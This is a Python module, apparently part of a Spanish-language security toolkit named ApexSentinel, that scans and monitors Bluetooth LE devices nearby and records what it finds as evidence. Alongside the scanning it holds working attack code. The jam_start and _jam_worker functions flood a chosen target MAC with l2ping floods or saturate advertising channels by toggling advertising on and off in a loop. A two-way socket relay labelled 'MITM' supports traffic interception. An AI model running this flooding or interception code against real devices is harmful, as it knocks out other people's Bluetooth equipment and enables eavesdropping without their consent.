from __future__ import annotations

import asyncio
import logging
import shutil
import socket
import subprocess
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import TYPE_CHECKING, Callable

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

if TYPE_CHECKING:
    from Main import ApexSentinel

from core.vendor_resolver import VendorResolver

log = logging.getLogger(__name__)

try:
    from bleak import BleakClient, BleakScanner
    from bleak.backends.device import BLEDevice
    from bleak.backends.scanner import AdvertisementData
    BLEAK_OK = True
except ImportError:
    BLEAK_OK = False
    BLEDevice = None
    AdvertisementData = None


_SERVICIOS_CONOCIDOS: dict[str, str] = {
    "0000180f": "Battery Service",
    "0000180a": "Device Information",
    "00001800": "Generic Access",
    "00001801": "Generic Attribute",
    "0000110b": "Audio Sink",
    "0000110a": "Audio Source",
    "0000111e": "Handsfree",
    "00001812": "HID (Human Interface Device)",
    "0000180d": "Heart Rate",
    "00001816": "Cycling Speed",
    "00001819": "Location & Navigation",
}

_FLOOD_INTERVAL_MS: int = 20
_FLOOD_DEFAULT_DUR: int = 30
_SCAN_TIMEOUT:      float = 10.0
_BRIDGE_TIMEOUT:    float = 30.0
_BRIDGE_BUF:        int = 4096


@dataclass
class DispositivoBLE:

    nombre: str
    address: str
    rssi: int
    fabricante: str
    servicios: list[str]
    primera_vez: str = field(
        default_factory=lambda: datetime.now().isoformat())
    ultima_vez: str = field(default_factory=lambda: datetime.now().isoformat())
    veces_visto: int = 1

    def actualizar(self, rssi: int) -> None:
        self.rssi = rssi
        self.ultima_vez = datetime.now().isoformat()
        self.veces_visto += 1

    def to_dict(self) -> dict:
        return {
            "nombre":      self.nombre,
            "address":     self.address,
            "rssi":        self.rssi,
            "fabricante":  self.fabricante,
            "servicios":   self.servicios,
            "primera_vez": self.primera_vez,
            "ultima_vez":  self.ultima_vez,
            "veces_visto": self.veces_visto,
        }

    @property
    def proximidad(self) -> str:
        if self.rssi >= -50:
            return "[bold red]MUY CERCA[/bold red]"
        if self.rssi >= -70:
            return "[yellow]CERCA[/yellow]"
        if self.rssi >= -85:
            return "[green]MEDIO[/green]"
        return "[dim]LEJOS[/dim]"

    @property
    def servicios_resueltos(self) -> list[str]:
        resultado = []
        for uuid in self.servicios:
            clave = uuid.lower()[:8]
            resultado.append(_SERVICIOS_CONOCIDOS.get(clave, uuid[:8]))
        return resultado


class BluetoothModule:

    SCAN_TIMEOUT:   float = _SCAN_TIMEOUT
    BRIDGE_TIMEOUT: float = _BRIDGE_TIMEOUT
    BRIDGE_BUF:     int = _BRIDGE_BUF

    # Interfaz HCI del CM4 con antena externa
    HCI_IFACE: str = "hci0"

    def __init__(self, sentinel: ApexSentinel):
        self.sentinel = sentinel
        self.console: Console = sentinel.console
        self.log_sys = getattr(sentinel, "log", None)
        self.gp = getattr(sentinel, "gp",  None)

        self._dispositivos: dict[str, DispositivoBLE] = {}
        self._lock = threading.Lock()
        self._monitoreo_activo = False
        self._jam_activo = False
        self._jam_hilo: threading.Thread | None = None
        self._jam_stop = threading.Event()

        if not BLEAK_OK:
            self._warn(
                "bleak no instalado — BLE deshabilitado. "
                "Instala con: pip install bleak --break-system-packages"
            )

    def _info(self, msg: str) -> None:
        if self.log_sys:
            self.log_sys.info(msg, "BluetoothModule")
        else:
            self.console.print(f"[cyan][*][/cyan] {msg}")

    def _warn(self, msg: str) -> None:
        if self.log_sys:
            self.log_sys.warning(msg, "BluetoothModule")
        else:
            self.console.print(f"[yellow][!][/yellow] {msg}")

    def _error(self, msg: str) -> None:
        if self.log_sys:
            self.log_sys.error(msg, "BluetoothModule")
        else:
            self.console.print(f"[red][!][/red] {msg}")

    def _run_async(self, coro) -> None:
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None

        if loop and loop.is_running():
            exc_box: list[BaseException] = []

            def _target() -> None:
                try:
                    asyncio.run(coro)
                except BaseException as exc:
                    exc_box.append(exc)

            t = threading.Thread(target=_target, daemon=True)
            t.start()
            t.join()
            if exc_box:
                raise exc_box[0]
        else:
            asyncio.run(coro)

    def _hci_cmd(self, args: list[str], check: bool = False) -> subprocess.CompletedProcess:
        return subprocess.run(
            ["sudo", "hciconfig", self.HCI_IFACE] + args,
            capture_output=True,
            text=True,
            check=check,
        )

    def activar_interfaz(self) -> bool:
        if shutil.which("hciconfig") is None:
            self._error(
                "hciconfig no encontrado. Instala: sudo apt install bluez")
            return False
        result = self._hci_cmd(["up"])
        if result.returncode != 0:
            self._error(
                f"No se pudo activar {self.HCI_IFACE}: {result.stderr.strip()}")
            log.error("hciconfig up failed: %s", result.stderr)
            return False
        self._info(f"Interfaz {self.HCI_IFACE} activada.")
        return True

    def _btmgmt_cmd(self, args: list[str]) -> subprocess.CompletedProcess:
        return subprocess.run(
            ["sudo", "btmgmt"] + args,
            capture_output=True,
            text=True,
        )

    def _potencia_tx(self, nivel: int) -> None:

        nivel = max(0, min(7, nivel))
        result = self._btmgmt_cmd(["phy"])
        if result.returncode != 0:
            log.warning("btmgmt phy no disponible: %s", result.stderr.strip())
            return
        log.info("Potencia TX solicitada: %d (referencia, sujeta al driver)", nivel)

    def _tabla_dispositivos(self, dispositivos: list[DispositivoBLE]) -> Panel:
        if not dispositivos:
            return Panel(
                "[dim]No se encontraron dispositivos BLE en el entorno.[/dim]",
                title="[bold cyan]BLUETOOTH LE — SCAN[/bold cyan]",
                border_style="cyan",
            )

        tb = Table(
            box=box.SIMPLE_HEAD,
            header_style="bold cyan",
            show_edge=False,
            expand=True,
        )
        tb.add_column("Dispositivo", style="white",  min_width=22)
        tb.add_column("MAC",         style="cyan",
                      min_width=18, no_wrap=True)
        tb.add_column("RSSI",        justify="right", min_width=8)
        tb.add_column("Proximidad",  min_width=12)
        tb.add_column("Fabricante",  style="yellow", min_width=14)
        tb.add_column("Servicios",   style="dim",    min_width=16)
        tb.add_column("Visto",       style="dim",
                      min_width=4, justify="right")

        for d in sorted(dispositivos, key=lambda d: d.rssi, reverse=True):
            rssi_style = (
                "bold red" if d.rssi >= -50 else
                "yellow" if d.rssi >= -70 else
                "green" if d.rssi >= -85 else
                "dim"
            )
            tb.add_row(
                d.nombre or "[dim]<sin nombre>[/dim]",
                d.address,
                f"[{rssi_style}]{d.rssi} dBm[/{rssi_style}]",
                d.proximidad,
                d.fabricante,
                ", ".join(d.servicios_resueltos[:3]) or "—",
                str(d.veces_visto),
            )

        ts = datetime.now().strftime("%H:%M:%S")
        return Panel(
            tb,
            title=(
                f"[bold cyan]BLUETOOTH LE — {len(dispositivos)} dispositivos[/bold cyan]"
                f"  [dim]{ts}[/dim]"
            ),
            border_style="cyan",
            box=box.HEAVY_HEAD,
        )

    def iniciar_jumper(self) -> None:
        if not BLEAK_OK:
            self.console.print(
                "[red][!] bleak no disponible. "
                "pip install bleak --break-system-packages[/red]"
            )
            return

        self.console.print(
            "\n[bold cyan][*] Iniciando escaneo Bluetooth LE...[/bold cyan]"
            f"\n[dim]    Timeout: {self.SCAN_TIMEOUT}s | "
            "Ctrl+C para interrumpir[/dim]\n"
        )
        try:
            self._run_async(self._escanear_una_vez())
        except KeyboardInterrupt:
            self.console.print("\n[yellow][!] Escaneo interrumpido.[/yellow]")
        except OSError as e:
            self._error(f"Error de sistema en escaneo BLE: {e}")
            log.exception("BLE scan OSError")

    async def _escanear_una_vez(self) -> None:
        encontrados: list[DispositivoBLE] = []

        def _callback(device: BLEDevice, adv: AdvertisementData) -> None:
            servicios = [str(u) for u in (adv.service_uuids or [])]
            disp = DispositivoBLE(
                nombre=device.name or "",
                address=device.address,
                rssi=adv.rssi if adv.rssi else -99,
                fabricante=VendorResolver.resolve(device.address),
                servicios=servicios,
            )
            encontrados.append(disp)
            with self._lock:
                if device.address in self._dispositivos:
                    self._dispositivos[device.address].actualizar(disp.rssi)
                else:
                    self._dispositivos[device.address] = disp

        scanner = BleakScanner(detection_callback=_callback)
        await scanner.start()
        await asyncio.sleep(self.SCAN_TIMEOUT)
        await scanner.stop()

        self.console.print(self._tabla_dispositivos(encontrados))
        self._registrar_evidencia(encontrados, "escaneo_unico")
        self._info(f"Escaneo BLE completado: {len(encontrados)} dispositivos")

    def monitoreo_continuo(
        self,
        duracion_seg: int = 60,
        callback_nuevo: Callable[[DispositivoBLE], None] | None = None,
    ) -> None:
        if not BLEAK_OK:
            self.console.print("[red][!] bleak no disponible.[/red]")
            return

        self.console.print(
            f"\n[bold cyan][*] Monitoreo BLE continuo — {duracion_seg}s[/bold cyan]\n"
            "[dim]    Ctrl+C para detener[/dim]\n"
        )
        self._monitoreo_activo = True
        try:
            self._run_async(self._monitoreo_loop(duracion_seg, callback_nuevo))
        except KeyboardInterrupt:
            self.console.print("\n[yellow][!] Monitoreo detenido.[/yellow]")
        except OSError as e:
            self._error(f"Error de sistema en monitoreo BLE: {e}")
            log.exception("BLE monitor OSError")
        finally:
            self._monitoreo_activo = False

    async def _monitoreo_loop(
        self,
        duracion_seg: int,
        callback_nuevo: Callable[[DispositivoBLE], None] | None,
    ) -> None:
        conocidos: set[str] = set()
        inicio = time.monotonic()

        while time.monotonic() - inicio < duracion_seg:
            ciclo_nuevos: list[DispositivoBLE] = []

            def _cb(device: BLEDevice, adv: AdvertisementData) -> None:
                servicios = [str(u) for u in (adv.service_uuids or [])]
                rssi = adv.rssi if adv.rssi else -99
                with self._lock:
                    if device.address in self._dispositivos:
                        self._dispositivos[device.address].actualizar(rssi)
                    else:
                        disp = DispositivoBLE(
                            nombre=device.name or "",
                            address=device.address,
                            rssi=rssi,
                            fabricante=VendorResolver.resolve(device.address),
                            servicios=servicios,
                        )
                        self._dispositivos[device.address] = disp
                        if device.address not in conocidos:
                            ciclo_nuevos.append(disp)
                            conocidos.add(device.address)
                            if callback_nuevo:
                                try:
                                    callback_nuevo(disp)
                                except Exception as exc:
                                    log.warning(
                                        "callback_nuevo lanzó excepción para %s: %s",
                                        device.address, exc,
                                    )

            scanner = BleakScanner(detection_callback=_cb)
            await scanner.start()
            await asyncio.sleep(min(5.0, duracion_seg))
            await scanner.stop()

            self.console.clear()
            with self._lock:
                todos = list(self._dispositivos.values())

            self.console.print(self._tabla_dispositivos(todos))
            elapsed = time.monotonic() - inicio
            self.console.print(
                f"[dim]  {elapsed:.0f}s / {duracion_seg}s  |  "
                f"Total sesión: {len(todos)}  |  "
                f"Nuevos este ciclo: {len(ciclo_nuevos)}[/dim]"
            )

            for d in ciclo_nuevos:
                self.console.print(
                    f"[bold cyan][+] NUEVO:[/bold cyan] "
                    f"{d.nombre or '<sin nombre>'} | {d.address} | "
                    f"{d.rssi} dBm | {d.fabricante}"
                )

        with self._lock:
            todos = list(self._dispositivos.values())
        self._registrar_evidencia(todos, "monitoreo_continuo")
        self._info(
            f"Monitoreo BLE {duracion_seg}s: {len(todos)} dispositivos únicos")

    def jam_start(
        self,
        duracion_seg: int = _FLOOD_DEFAULT_DUR,
        target_mac: str | None = None,
        intervalo_ms: int = _FLOOD_INTERVAL_MS,
    ) -> bool:
        if self._jam_activo:
            self._warn("Flooding ya en curso. Usa jam_stop() primero.")
            return False

        if shutil.which("hcitool") is None:
            self._error(
                "hcitool no encontrado. Instala: sudo apt install bluez")
            return False

        if not self.activar_interfaz():
            return False

        self._jam_stop.clear()
        self._jam_activo = True

        modo = f"dirigido → {target_mac}" if target_mac else "broadcast"
        self.console.print(
            f"\n[bold red][!] FLOODING BLE ACTIVO[/bold red]\n"
            f"[dim]    Modo: {modo}  |  "
            f"Duración: {duracion_seg}s  |  "
            f"Intervalo: {intervalo_ms}ms  |  "
            f"Interfaz: {self.HCI_IFACE}[/dim]\n"
        )
        log.warning(
            "Flooding BLE iniciado: target=%s duracion=%ds iface=%s",
            target_mac or "broadcast", duracion_seg, self.HCI_IFACE,
        )

        self._jam_hilo = threading.Thread(
            target=self._jam_worker,
            args=(duracion_seg, target_mac, intervalo_ms),
            daemon=True,
            name="bt-flood",
        )
        self._jam_hilo.start()
        return True

    def jam_stop(self) -> None:
        if not self._jam_activo:
            self._warn("No hay flooding activo.")
            return
        self._jam_stop.set()
        if self._jam_hilo:
            self._jam_hilo.join(timeout=5)
        self._jam_activo = False
        self.console.print("[yellow][!] Flooding BLE detenido.[/yellow]")
        log.info("Flooding BLE detenido manualmente.")

    def _jam_worker(
        self,
        duracion_seg: int,
        target_mac: str | None,
        intervalo_ms: int,
    ) -> None:
        inicio = time.monotonic()
        intervalo_s = intervalo_ms / 1000.0
        paquetes = 0
        proc: subprocess.Popen | None = None

        try:
            while not self._jam_stop.is_set():
                if time.monotonic() - inicio >= duracion_seg:
                    break

                if target_mac:
                    cmd = [
                        "sudo", "l2ping",
                        "-i", self.HCI_IFACE,
                        "-s", "600",
                        "-f",
                        target_mac,
                    ]
                    proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    tiempo_restante = duracion_seg - \
                        (time.monotonic() - inicio)
                    deadline = min(tiempo_restante, 5.0)
                    try:
                        proc.wait(timeout=deadline)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait()
                    paquetes += 1

                else:
                    # Flood broadcast: advertising ADV_NONCONN_IND en canal 37/38/39
                    # hcitool cmd 0x08 0x0008: LE Set Advertise Enable
                    # Primero configura advertising data con payload aleatorio,
                    # luego habilita y deshabilita en bucle para saturar el canal.
                    cmd_enable = ["sudo", "hcitool", "-i", self.HCI_IFACE,
                                  "cmd", "0x08", "0x000A", "01"]
                    cmd_disable = ["sudo", "hcitool", "-i", self.HCI_IFACE,
                                   "cmd", "0x08", "0x000A", "00"]

                    subprocess.run(cmd_enable,  capture_output=True)
                    time.sleep(intervalo_s)
                    subprocess.run(cmd_disable, capture_output=True)
                    paquetes += 1

                if not target_mac:
                    time.sleep(intervalo_s)

        except Exception as exc:
            log.error("_jam_worker excepción: %s", exc)
        finally:
            if proc and proc.poll() is None:
                proc.kill()
                proc.wait()
            if not target_mac:
                subprocess.run(
                    ["sudo", "hcitool", "-i", self.HCI_IFACE,
                     "cmd", "0x08", "0x000A", "00"],
                    capture_output=True,
                )
            self._jam_activo = False
            elapsed = round(time.monotonic() - inicio, 1)
            log.info("Flooding BLE finalizado: %d paquetes en %.1fs",
                     paquetes, elapsed)
            self._info(
                f"Flooding BLE finalizado: {paquetes} paquetes en {elapsed}s")

    def _registrar_evidencia(
        self,
        dispositivos: list[DispositivoBLE],
        tipo: str,
    ) -> None:
        if not self.gp or not dispositivos:
            return
        try:
            self.gp.registrar_evidencia(
                f"bt_{tipo}",
                f"BLE {tipo}: {len(dispositivos)} dispositivos",
                {
                    "tipo":         tipo,
                    "timestamp":    datetime.now().isoformat(),
                    "total":        len(dispositivos),
                    "dispositivos": [d.to_dict() for d in dispositivos],
                },
            )
            for d in (d for d in dispositivos if d.rssi >= -50):
                self.gp.registrar_hallazgo(
                    "MEDIO",
                    f"Dispositivo BLE muy cercano: {d.nombre or d.address}",
                    f"MAC: {d.address}  RSSI: {d.rssi} dBm  Fabricante: {d.fabricante}",
                    "Verificar si es un dispositivo autorizado en el entorno.",
                )
        except OSError as e:
            log.warning("Error registrando evidencia BLE: %s", e)

    def puente(
        self,
        origen: socket.socket,
        destino: socket.socket,
        etiqueta: str = "BRIDGE",
    ) -> dict:
        metricas = {
            "bytes_tx":   0,
            "paquetes":   0,
            "duracion_s": 0.0,
            "errores":    0,
            "etiqueta":   etiqueta,
        }
        inicio = time.monotonic()

        try:
            origen.settimeout(self.BRIDGE_TIMEOUT)
            destino.settimeout(self.BRIDGE_TIMEOUT)

            self._info(
                f"[{etiqueta}] Puente TCP activo — "
                f"buf={self.BRIDGE_BUF}B  timeout={self.BRIDGE_TIMEOUT}s"
            )

            while True:
                try:
                    data = origen.recv(self.BRIDGE_BUF)
                except socket.timeout:
                    self._warn(f"[{etiqueta}] Timeout — cerrando puente.")
                    break

                if not data:
                    self._info(f"[{etiqueta}] Conexión cerrada por el origen.")
                    break

                try:
                    destino.sendall(data)
                    metricas["bytes_tx"] += len(data)
                    metricas["paquetes"] += 1
                    log.debug("[%s] → %d bytes", etiqueta, len(data))
                except (OSError, BrokenPipeError) as e:
                    self._warn(f"[{etiqueta}] Error de escritura: {e}")
                    metricas["errores"] += 1
                    break

        except OSError as e:
            self._error(f"[{etiqueta}] Error de socket: {e}")
            metricas["errores"] += 1
            log.exception("[%s] Socket error", etiqueta)

        finally:
            metricas["duracion_s"] = round(time.monotonic() - inicio, 2)
            for sock in (origen, destino):
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                except OSError:
                    pass

            self._info(
                f"[{etiqueta}] Puente cerrado — "
                f"{metricas['bytes_tx']:,} bytes  "
                f"{metricas['paquetes']} paquetes  "
                f"{metricas['duracion_s']}s  "
                f"errores: {metricas['errores']}"
            )

        return metricas

    def puente_bidireccional(
        self,
        sock_a: socket.socket,
        sock_b: socket.socket,
        etiqueta: str = "MITM",
    ) -> tuple[dict, dict]:
        metricas_ab: dict = {}
        metricas_ba: dict = {}
        evento_stop = threading.Event()

        def _hilo_ab() -> None:
            metricas_ab.update(self.puente(sock_a, sock_b, f"{etiqueta} A→B"))
            evento_stop.set()

        def _hilo_ba() -> None:
            metricas_ba.update(self.puente(sock_b, sock_a, f"{etiqueta} B→A"))
            evento_stop.set()

        t_ab = threading.Thread(target=_hilo_ab, daemon=True)
        t_ba = threading.Thread(target=_hilo_ba, daemon=True)
        t_ab.start()
        t_ba.start()

        evento_stop.wait()
        t_ab.join(timeout=2)
        t_ba.join(timeout=2)

        return metricas_ab, metricas_ba

    def estado(self) -> None:
        with self._lock:
            total = len(self._dispositivos)
            cercanos = sum(
                1 for d in self._dispositivos.values() if d.rssi >= -50)
            fabricantes = {
                d.fabricante
                for d in self._dispositivos.values()
                if d.fabricante != "Desconocido"
            }

        g = Table.grid(padding=(0, 3))
        g.add_column(style="dim cyan", justify="right", min_width=22)
        g.add_column(style="white")

        g.add_row("Driver BLE",
                  "[green]bleak OK[/green]" if BLEAK_OK else "[red]No disponible[/red]")
        g.add_row("Interfaz HCI",        self.HCI_IFACE)
        g.add_row("Dispositivos sesión", str(total))
        g.add_row("Muy cercanos",        str(cercanos))
        g.add_row("Fabricantes únicos",  str(len(fabricantes)))
        g.add_row("Monitoreo activo",
                  "[green]SÍ[/green]" if self._monitoreo_activo else "[dim]NO[/dim]")
        g.add_row("Flooding activo",
                  "[red]SÍ[/red]" if self._jam_activo else "[dim]NO[/dim]")
        g.add_row("Timeout puente",      f"{self.BRIDGE_TIMEOUT}s")
        g.add_row("Buffer puente",       f"{self.BRIDGE_BUF} bytes")

        self.console.print(Panel(
            g,
            title="[bold cyan]BLUETOOTH MODULE — ESTADO[/bold cyan]",
            border_style="cyan",
        ))

    def limpiar_sesion(self) -> None:
        with self._lock:
            n = len(self._dispositivos)
            self._dispositivos.clear()
        self._info(f"Sesión BLE reseteada ({n} dispositivos eliminados).")
